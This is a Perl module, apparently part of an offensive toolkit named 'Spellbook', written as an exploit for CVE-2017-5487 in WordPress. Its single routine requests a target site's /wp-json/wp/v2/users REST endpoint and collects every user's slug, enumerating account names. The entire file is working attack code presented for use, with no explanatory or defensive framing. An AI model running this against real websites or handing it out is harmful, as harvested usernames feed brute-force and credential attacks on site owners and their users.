package Spellbook::Exploits::CVE_2017_5487 {
    use JSON;
    use strict;
    use warnings;
    use Try::Tiny;
    use LWP::UserAgent;

    sub new {
        my ($self, $target)= @_;
        my @result = ();

        if ($target) {
            my $userAgent = LWP::UserAgent -> new(agent => "Spellbook");
            my $request   = $userAgent -> get("$target/wp-json/wp/v2/users");
            my $content   = decode_json ($request -> content());
            
            foreach my $data (@$content) {
                my $username = $data -> {slug};
                push @result, $username, "\n";
            }
        }   

        return @result;
    }
}

1;